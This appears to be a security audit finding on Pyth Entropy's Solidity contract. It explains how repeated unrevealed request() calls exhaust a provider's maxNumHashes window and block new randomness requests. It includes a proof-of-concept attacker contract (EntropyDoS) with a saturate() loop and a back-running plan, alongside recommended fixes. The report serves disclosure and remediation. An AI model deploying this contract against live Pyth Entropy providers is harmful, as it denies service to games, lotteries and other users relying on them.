### Title
Unprivileged Users Can Exhaust Provider's `maxNumHashes` Capacity via Unrevealed `request()` Calls, Causing Denial-of-Service on New Entropy Requests - (File: `target_chains/ethereum/contracts/contracts/entropy/Entropy.sol`)

---

### Summary

Any user paying the protocol fee can call `request()` (non-callback path) repeatedly and deliberately withhold the reveal, exhausting the provider's `maxNumHashes` window. Once the outstanding unrevealed request count reaches `maxNumHashes`, every subsequent `requestHelper` call reverts with `LastRevealedTooOld`, blocking all new entropy requests to that provider until the provider manually calls `advanceProviderCommitment`. An attacker can back-run that recovery transaction to immediately re-saturate the window, creating a sustained denial-of-service.

---

### Finding Description

In `requestHelper`, the contract computes:

```solidity
req.numHashes = SafeCast.toUint32(
    assignedSequenceNumber -
        providerInfo.currentCommitmentSequenceNumber
);
if (
    providerInfo.maxNumHashes != 0 &&
    req.numHashes > providerInfo.maxNumHashes
) {
    revert EntropyErrors.LastRevealedTooOld();
}
```

`numHashes` grows by 1 for every new request that has not yet been revealed, because `currentCommitmentSequenceNumber` only advances when a reveal is processed. [1](#0-0) 

The non-callback `reveal()` function enforces:

```solidity
if (req.requester != msg.sender) {
    revert EntropyErrors.Unauthorized();
}
```

This means only the original requester can reveal a non-callback request. [2](#0-1) 

An attacker therefore calls `request()` exactly `maxNumHashes` times, paying the fee each time, and never calls `reveal()`. Because `currentCommitmentSequenceNumber` stays frozen, the very next legitimate user's request computes `numHashes = maxNumHashes + 1`, which exceeds the limit and reverts. [3](#0-2) 

The provider can recover by calling `advanceProviderCommitment`, which advances `currentCommitmentSequenceNumber` forward, reducing `numHashes` for future requests. [4](#0-3) 

However, the Fortuna keeper only polls for this condition every 30 seconds (`UPDATE_COMMITMENTS_INTERVAL`), and the attacker can back-run the recovery transaction with another batch of `maxNumHashes` requests to immediately re-trigger the DoS. [5](#0-4) 

The `requestsOverflow` mapping in `EntropyState` means there is no hard cap on the number of in-flight requests stored — the attacker's unrevealed requests persist indefinitely in the overflow mapping. [6](#0-5) 

---

### Impact Explanation

All new calls to `request()`, `requestWithCallback()`, and `requestV2()` targeting the affected provider revert with `LastRevealedTooOld` for as long as the attacker's unrevealed requests keep `numHashes` above `maxNumHashes`. Legitimate consumers (e.g., on-chain games, lotteries, NFT mints) that depend on Pyth Entropy are denied service. The attacker can sustain the DoS by back-running each `advanceProviderCommitment` recovery transaction, creating a persistent outage against the targeted provider.

---

### Likelihood Explanation

The attack requires only the ability to call `request()` and pay the provider fee per slot. No privileged access, leaked key, or governance majority is needed. The cost is bounded by `maxNumHashes × fee`, which for the default Pyth provider is a finite, attacker-controllable expenditure. A well-funded competitor or griefing actor can sustain the attack indefinitely by recycling the back-run pattern. The Fortuna keeper's own warning message explicitly acknowledges this scenario: `"possible outage or DDOS attack"`. [7](#0-6) 

---

### Recommendation

- **Short term**: Remove the `req.requester == msg.sender` restriction from `reveal()`, or allow the provider (or anyone) to force-reveal abandoned non-callback requests after a timeout (e.g., N blocks). This eliminates the attacker's ability to hold slots hostage.
- **Long term**: Introduce a per-address cap on the number of simultaneously outstanding non-callback requests, or require a refundable deposit that is slashed if a request is not revealed within a deadline, disincentivizing slot-squatting.

---

### Proof of Concept

```solidity
// Attacker contract
contract EntropyDoS {
    IEntropy entropy;
    address provider;
    uint32 maxNumHashes;

    constructor(address _entropy, address _provider, uint32 _maxNumHashes) {
        entropy = IEntropy(_entropy);
        provider = _provider;
        maxNumHashes = _maxNumHashes;
    }

    // Step 1: fill all maxNumHashes slots with unrevealed non-callback requests
    function saturate() external payable {
        uint128 fee = entropy.getFee(provider);
        for (uint32 i = 0; i < maxNumHashes; i++) {
            // Use request() so only this contract can reveal
            entropy.request{value: fee}(
                provider,
                keccak256(abi.encodePacked(i, block.timestamp)),
                false
            );
        }
    }

    // Step 2: never call reveal() — slots remain in-flight forever
    // Any subsequent call by a legitimate user to request/requestV2/requestWithCallback
    // will revert with LastRevealedTooOld.

    // Step 3: back-run advanceProviderCommitment with another saturate() call
    // to maintain the DoS.
}
```

After `saturate()`, any call such as:
```solidity
entropy.requestWithCallback{value: fee}(provider, userContribution);
// reverts: EntropyErrors.LastRevealedTooOld
```
will revert until the provider calls `advanceProviderCommitment`, at which point the attacker immediately re-saturates. [8](#0-7)

### Citations

**File:** target_chains/ethereum/contracts/contracts/entropy/Entropy.sol (L228-231)
```text
        uint64 assignedSequenceNumber = providerInfo.sequenceNumber;
        if (assignedSequenceNumber >= providerInfo.endSequenceNumber)
            revert EntropyErrors.OutOfRandomness();
        providerInfo.sequenceNumber += 1;
```

**File:** target_chains/ethereum/contracts/contracts/entropy/Entropy.sol (L247-256)
```text
        req.numHashes = SafeCast.toUint32(
            assignedSequenceNumber -
                providerInfo.currentCommitmentSequenceNumber
        );
        if (
            providerInfo.maxNumHashes != 0 &&
            req.numHashes > providerInfo.maxNumHashes
        ) {
            revert EntropyErrors.LastRevealedTooOld();
        }
```

**File:** target_chains/ethereum/contracts/contracts/entropy/Entropy.sol (L443-484)
```text
    function advanceProviderCommitment(
        address provider,
        uint64 advancedSequenceNumber,
        bytes32 providerContribution
    ) public override {
        EntropyStructsV2.ProviderInfo storage providerInfo = _state.providers[
            provider
        ];
        if (
            advancedSequenceNumber <=
            providerInfo.currentCommitmentSequenceNumber
        ) revert EntropyErrors.UpdateTooOld();
        if (advancedSequenceNumber >= providerInfo.endSequenceNumber)
            revert EntropyErrors.AssertionFailure();

        uint32 numHashes = SafeCast.toUint32(
            advancedSequenceNumber -
                providerInfo.currentCommitmentSequenceNumber
        );
        bytes32 providerCommitment = constructProviderCommitment(
            numHashes,
            providerContribution
        );

        if (providerCommitment != providerInfo.currentCommitment)
            revert EntropyErrors.IncorrectRevelation();

        providerInfo.currentCommitmentSequenceNumber = advancedSequenceNumber;
        providerInfo.currentCommitment = providerContribution;
        if (
            providerInfo.currentCommitmentSequenceNumber >=
            providerInfo.sequenceNumber
        ) {
            // This means the provider called the function with a sequence number that was not yet requested.
            // Providers should never do this and we consider such an implementation flawed.
            // Assuming this is landed on-chain it's better to bump the sequence number and never use that range
            // for future requests. Otherwise, someone can use the leaked revelation to derive favorable random numbers.
            providerInfo.sequenceNumber =
                providerInfo.currentCommitmentSequenceNumber +
                1;
        }
    }
```

**File:** target_chains/ethereum/contracts/contracts/entropy/Entropy.sol (L513-515)
```text
        if (req.requester != msg.sender) {
            revert EntropyErrors.Unauthorized();
        }
```

**File:** apps/fortuna/src/keeper/commitment.rs (L14-70)
```rust
const UPDATE_COMMITMENTS_INTERVAL: Duration = Duration::from_secs(30);
const UPDATE_COMMITMENTS_THRESHOLD_FACTOR: f64 = 0.95;

#[tracing::instrument(name = "update_commitments", skip_all)]
pub async fn update_commitments_loop(
    contract: Arc<InstrumentedSignablePythContract>,
    chain_state: BlockchainState,
) {
    loop {
        if let Err(e) = update_commitments_if_necessary(contract.clone(), &chain_state)
            .in_current_span()
            .await
        {
            tracing::error!("Update commitments. error: {:?}", e);
        }
        time::sleep(UPDATE_COMMITMENTS_INTERVAL).await;
    }
}

pub async fn update_commitments_if_necessary(
    contract: Arc<InstrumentedSignablePythContract>,
    chain_state: &BlockchainState,
) -> Result<()> {
    //TODO: we can reuse the result from the last call from the watch_blocks thread to reduce RPCs
    let latest_safe_block = get_latest_safe_block(chain_state).in_current_span().await;
    let provider_address = chain_state.provider_address;
    let provider_info = contract
        .get_provider_info_v2(provider_address)
        .block(latest_safe_block) // To ensure we are not revealing sooner than we should
        .call()
        .await
        .map_err(|e| {
            anyhow!(
                "Error while getting provider info at block {}. error: {:?}",
                latest_safe_block,
                e
            )
        })?;
    if provider_info.max_num_hashes == 0 {
        return Ok(());
    }
    let threshold =
        ((provider_info.max_num_hashes as f64) * UPDATE_COMMITMENTS_THRESHOLD_FACTOR) as u64;
    let outstanding_requests =
        provider_info.sequence_number - provider_info.current_commitment_sequence_number;
    if outstanding_requests > threshold {
        // NOTE: This log message triggers a grafana alert. If you want to change the text, please change the alert also.
        tracing::warn!("Update commitments threshold reached -- possible outage or DDOS attack. Number of outstanding requests: {:?} Threshold: {:?}", outstanding_requests, threshold);
        let seq_number = provider_info.sequence_number - 1;
        let provider_revelation = chain_state
            .state
            .reveal(seq_number)
            .map_err(|e| anyhow!("Error revealing: {:?}", e))?;
        let contract_call =
            contract.advance_provider_commitment(provider_address, seq_number, provider_revelation);
        send_and_confirm(contract_call).await?;
    }
```

**File:** target_chains/ethereum/contracts/contracts/entropy/EntropyState.sol (L33-34)
```text
        EntropyStructsV2.Request[32] requests;
        mapping(bytes32 => EntropyStructsV2.Request) requestsOverflow;
```
